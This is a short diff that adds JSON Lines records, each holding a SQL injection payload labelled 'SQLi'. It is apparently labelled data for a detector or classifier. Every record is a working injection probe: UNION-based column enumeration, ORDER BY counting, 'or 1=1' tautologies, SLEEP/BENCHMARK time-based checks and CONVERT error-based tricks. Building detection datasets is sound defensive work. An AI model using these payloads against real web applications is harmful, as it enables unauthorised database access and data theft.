+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#", "type": "SQLi"}
+{"payload": "ORDER BY 26#", "type": "SQLi"}
+{"payload": "WHERE 1=1 AND 1=1#", "type": "SQLi"}
+{"payload": "' or uid like '%", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#", "type": "SQLi"}
+{"payload": "HAVING 1=0--", "type": "SQLi"}
+{"payload": "ORDER BY 1,SLEEP(5),3#", "type": "SQLi"}
+{"payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#", "type": "SQLi"}
+{"payload": "ORDER BY 21", "type": "SQLi"}
+{"payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3", "type": "SQLi"}
+{"payload": "or 1=1--", "type": "SQLi"}
+{"payload": "AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))", "type": "SQLi"}
+{"payload": "AND 1=0 AND '%'='", "type": "SQLi"}
+{"payload": "AND 1=1#", "type": "SQLi"}
